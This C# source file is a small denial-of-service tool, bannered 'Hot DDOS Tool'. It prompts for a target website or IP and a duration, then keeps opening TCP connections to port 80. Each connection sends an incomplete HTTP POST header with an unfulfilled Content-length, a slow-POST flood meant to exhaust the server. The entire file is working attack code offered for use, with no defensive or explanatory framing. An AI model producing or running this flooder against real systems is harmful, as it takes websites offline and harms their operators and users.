using System;
using System.Collections.Generic;
using System.IO;
using System.Net.Sockets;
using System.Threading;


namespace HTTPFlooder
{
    internal class HTTPFlooder
    {
        private static void Main(string[] args)
        {
            Console.ForegroundColor = ConsoleColor.DarkCyan;
            Console.WriteLine("\n +-----------------------------------------------------+");
            Console.WriteLine(" + +");
            Console.WriteLine(" -------+ Hot DDOS Tool :) +-------");
            Console.WriteLine(" + +");
            Console.WriteLine(" +-----------------------------------------------------+\n");
            Console.Write("Website (www.example.com or and ip): ");
            string website = Console.ReadLine();
            Console.Write("Duration (seconds): ");
            string s = Console.ReadLine();
            int count = 1;
            bool loop = true;
            Thread thread = new Thread(delegate()
            {
                List<TcpClient> clients = new List<TcpClient> ();
                while (loop)
                {
                    new Thread(delegate()
                    {
                        TcpClient tcpClient = new TcpClient();
                        clients.Add(tcpClient);
                        try
                        {
                            tcpClient.Connect(website, 80);
                            StreamWriter streamWriter = new StreamWriter(tcpClient.GetStream());
                            streamWriter.Write("POST / HTTP/1.1\r\nHost: " + website + "\r\nContent-length: 5235\r\n\r\n");
                            streamWriter.Flush();
                            if (loop)
                            {
                                Console.WriteLine("Packets sent: " + count);
                            }
                            count++;
                        }
                        catch (Exception)
                        {
                            if (loop)
                            {
                                Console.WriteLine("Could not send packets, server may be inaccessible.");
                            }
                        }
                    }).Start();
                    Thread.Sleep(50);
                }
                foreach (TcpClient current in clients)
                {
                    try
                    {
                        current.GetStream().Dispose();
                    }
                    catch (Exception)
                    {
                    }
                }
            });
            thread.Start();
            Thread.Sleep(int.Parse(s) * 1000);
            loop = false;
            Console.WriteLine("\nDone (:");
            Console.WriteLine("Press any key to close this program...");
            Console.ReadKey();
        }
    }
}
